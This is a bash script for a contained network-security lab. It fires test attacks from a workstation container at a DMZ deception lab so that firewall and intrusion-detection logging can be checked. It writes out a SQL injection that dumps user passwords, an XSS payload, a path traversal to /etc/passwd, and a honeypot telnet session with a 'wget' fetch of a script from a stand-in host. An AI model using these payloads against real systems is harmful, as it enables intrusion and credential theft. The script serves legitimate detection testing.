#!/usr/bin/env bash
# Controlled hostile traffic from the untrusted workstation (pc1) toward the DMZ deception lab, so that
# fw-dmz, Suricata, Wazuh and Logstash have something to see. LAB ONLY: the target is fixed, nothing here
# takes a host or a command from the environment. Requires `make net` and `make dmzlab-up`.
set -uo pipefail

TARGET=195.1.1.161                 # dmz-web; dmz-vuln and dmz-honeypot share its network namespace
PC=clab-companyxyz-pc1
WEB=clab-companyxyz-dmz-web

for node in "$PC" "$WEB"; do
  docker inspect -f '{{.State.Running}}' "$node" 2>/dev/null | grep -q true \
    || { echo "$node is not running: bring the fabric up first (make net)" >&2; exit 2; }
done

probe() { docker exec "$PC" curl -s -o /dev/null -m 8 -w "  %{http_code}  $1\n" "${@:2}" || echo "  ---  $1 (no response)"; }

echo "== vulnerable web application (OWASP Juice Shop, tcp/3000) =="
probe "front page" "http://$TARGET:3000/"
probe "SQL injection (UNION SELECT)" "http://$TARGET:3000/rest/products/search?q=%27%29%29%20UNION%20SELECT%20id%2Cemail%2Cpassword%2C4%2C5%2C6%2C7%2C8%2C9%20FROM%20Users--"
probe "reflected XSS payload" "http://$TARGET:3000/rest/products/search?q=%3Ciframe%20src%3D%22javascript%3Aalert(1)%22%3E"
probe "path traversal" "http://$TARGET:3000/ftp/..%2f..%2fetc%2fpasswd"
probe "scanner user agent (sqlmap)" -A "sqlmap/1.7.2#stable (https://sqlmap.org)" "http://$TARGET:3000/rest/products/search?q=1"

echo "== honeypot (Cowrie) =="
printf '  SSH banner : '
docker exec "$PC" sh -c "nc -w 3 $TARGET 2222 </dev/null | head -c 40 | tr -d '\r\n'" || true
echo
echo "  telnet session (credentials and commands are recorded by the honeypot, passwords are not indexed):"
printf 'root\r\n123456\r\nwhoami\r\nuname -a\r\nwget http://203.0.113.9/x.sh\r\nexit\r\n' \
  | docker exec -i "$PC" nc -w 6 "$TARGET" 2223 >/dev/null 2>&1 || true
echo "  sent"

echo "== isolation check: the DMZ host must NOT be able to reach internal zones =="
for dest in "172.16.50.1 22" "192.168.10.1 22"; do
  if docker exec "$WEB" sh -c "nc -zw 3 $dest" >/dev/null 2>&1; then
    echo "  FAIL: dmz-web reached $dest  (the pivot deny is not working!)"
    status=1
  else
    echo "  ok  : dmz-web cannot reach $dest"
  fi
done

echo
echo "Now look at: Kibana (soc-alerts-*, dataset cowrie.honeypot / suricata.eve), the firewall logs (CXYZ-DMZLAB-*),"
echo "and the counters:  docker exec clab-companyxyz-fw-dmz nft list counters table inet dmz"
exit "${status:-0}"
